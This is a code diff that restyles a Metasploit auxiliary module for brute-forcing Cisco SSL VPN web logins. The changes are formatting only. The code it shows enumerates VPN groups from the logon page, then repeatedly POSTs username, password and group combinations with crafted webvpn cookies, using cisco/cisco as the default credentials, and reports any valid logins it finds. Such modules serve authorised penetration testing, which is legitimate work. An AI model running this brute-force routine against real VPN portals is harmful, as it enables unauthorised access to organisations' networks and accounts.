@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,40 +8,39 @@ require 'rex/proto/http'
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Cisco SSL VPN Bruteforce Login Utility',
-      'Description'    => %{
-        This module scans for Cisco SSL VPN web login portals and
-        performs login brute force to identify valid credentials.
-      },
-      'Author'         =>
-        [
-          'Jonathan Claudius <jclaudius[at]trustwave.com>'
-        ],
-      'License'        => MSF_LICENSE,
-      'DefaultOptions' =>
-        {
-          'SSL' => true,
-          'USERNAME' => 'cisco',
-          'PASSWORD' => 'cisco'
-        }
-    ))
+                      'Name'           => 'Cisco SSL VPN Bruteforce Login Utility',
+                      'Description'    => %(
+                        This module scans for Cisco SSL VPN web login portals and
+                        performs login brute force to identify valid credentials.
+                      ),
+                      'Author'         =>
+                        [
+                          'Jonathan Claudius <jclaudius[at]trustwave.com>'
+                        ],
+                      'License'        => MSF_LICENSE,
+                      'DefaultOptions' =>
+                        {
+                          'SSL' => true,
+                          'USERNAME' => 'cisco',
+                          'PASSWORD' => 'cisco'
+                        }))
 
     register_options(
       [
         Opt::RPORT(443),
         OptString.new('GROUP', [false, "A specific VPN group to use", ''])
-      ], self.class)
+      ], self.class
+    )
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     unless check_conn?
       vprint_error("Connection failed, Aborting...")
       return false
@@ -63,7 +63,7 @@ class MetasploitModule < Msf::Auxiliary
         vprint_warning("Using the default group: DefaultWEBVPNGroup")
         groups << "DefaultWEBVPNGroup"
       else
-        vprint_good("Enumerated VPN Groups: #{groups.to_a.join(", ")}")
+        vprint_good("Enumerated VPN Groups: #{groups.to_a.join(', ')}")
       end
 
     else
@@ -98,18 +98,18 @@ class MetasploitModule < Msf::Auxiliary
 
   def enumerate_vpn_groups
     res = send_request_cgi(
-            'uri' => '/+CSCOE+/logon.html',
-            'method' => 'GET',
-          )
+      'uri' => '/+CSCOE+/logon.html',
+      'method' => 'GET'
+    )
 
     if res &&
        res.code == 302
 
       res = send_request_cgi(
-              'uri' => '/+CSCOE+/logon.html',
-              'method' => 'GET',
-              'vars_get' => { 'fcadbadd' => "1" }
-            )
+        'uri' => '/+CSCOE+/logon.html',
+        'method' => 'GET',
+        'vars_get' => { 'fcadbadd' => "1" }
+      )
     end
 
     groups = Set.new
@@ -122,24 +122,24 @@ class MetasploitModule < Msf::Auxiliary
       groups = group_string.scan(/'([\w\-0-9]+)'/).flatten.to_set
     end
 
-    return groups
+    groups
   end
 
   # Verify whether we're working with SSL VPN or not
   def is_app_ssl_vpn?
     res = send_request_cgi(
-            'uri' => '/+CSCOE+/logon.html',
-            'method' => 'GET',
-          )
+      'uri' => '/+CSCOE+/logon.html',
+      'method' => 'GET'
+    )
 
     if res &&
        res.code == 302
 
       res = send_request_cgi(
-              'uri' => '/+CSCOE+/logon.html',
-              'method' => 'GET',
-              'vars_get' => { 'fcadbadd' => "1" }
-            )
+        'uri' => '/+CSCOE+/logon.html',
+        'method' => 'GET',
+        'vars_get' => { 'fcadbadd' => "1" }
+      )
     end
 
     if res &&
@@ -154,10 +154,10 @@ class MetasploitModule < Msf::Auxiliary
 
   def do_logout(cookie)
     res = send_request_cgi(
-            'uri' => '/+webvpn+/webvpn_logout.html',
-            'method' => 'GET',
-            'cookie'    => cookie
-          )
+      'uri' => '/+webvpn+/webvpn_logout.html',
+      'method' => 'GET',
+      'cookie' => cookie
+    )
   end
 
   def report_cred(opts)
@@ -187,17 +187,16 @@ class MetasploitModule < Msf::Auxiliary
     create_credential_login(login_data)
   end
 
-
   # Brute-force the login page
   def do_login(user, pass, group)
     vprint_status("Trying username:#{user.inspect} with password:#{pass.inspect} and group:#{group.inspect}")
 
     begin
-      cookie = "webvpn=; " +
-               "webvpnc=; " +
-               "webvpn_portal=; " +
-               "webvpnSharePoint=; " +
-               "webvpnlogin=1; " +
+      cookie = "webvpn=; " \
+               "webvpnc=; " \
+               "webvpn_portal=; " \
+               "webvpnSharePoint=; " \
+               "webvpnlogin=1; " \
                "webvpnLang=en;"
 
       post_params = {
@@ -206,18 +205,18 @@ class MetasploitModule < Msf::Auxiliary
         'tgcookieset' => '',
         'username' => user,
         'password' => pass,
-        'Login'   => 'Logon'
+        'Login' => 'Logon'
       }
 
       post_params['group_list'] = group unless group.empty?
 
       res = send_request_cgi(
-              'uri' => '/+webvpn+/index.html',
-              'method' => 'POST',
-              'ctype' => 'application/x-www-form-urlencoded',
-              'cookie' => cookie,
-              'vars_post' => post_params
-            )
+        'uri' => '/+webvpn+/index.html',
+        'method' => 'POST',
+        'ctype' => 'application/x-www-form-urlencoded',
+        'cookie' => cookie,
+        'vars_post' => post_params
+      )
 
       if res &&
          res.code == 200 &&
